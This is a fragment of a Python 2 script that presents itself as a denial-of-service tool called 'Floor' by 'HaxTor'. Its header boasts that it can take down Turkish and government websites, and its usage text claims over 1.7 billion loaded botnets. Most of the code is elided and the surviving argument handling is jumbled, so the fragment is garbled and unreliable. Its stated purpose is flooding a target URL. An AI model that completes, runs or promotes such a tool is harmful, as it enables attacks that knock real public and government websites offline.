# ----------------------------------------------------------------------------------------------
# Floor - iDDoS Priv8 Tool
#
# The iDDoS Protocol is the most massive type of attack
# This tool can tangodown Turkish Site and more gov websites
# 
# author : HaxTor, version 2.0
# Team Member : HaxTor , Code Boy , Professor
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print 'Floor Priv8 Haxtor iDDoS Tool ( individual Dangerous Denial of Service )'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: floor (url)'
	print 'Example: floor.py http://turk.com'
	print "\a"
print \
"""
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting the Floor shotings in webserver Hyper Massive Revolt DDoS Tool"
		print "Created By HaxTor"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
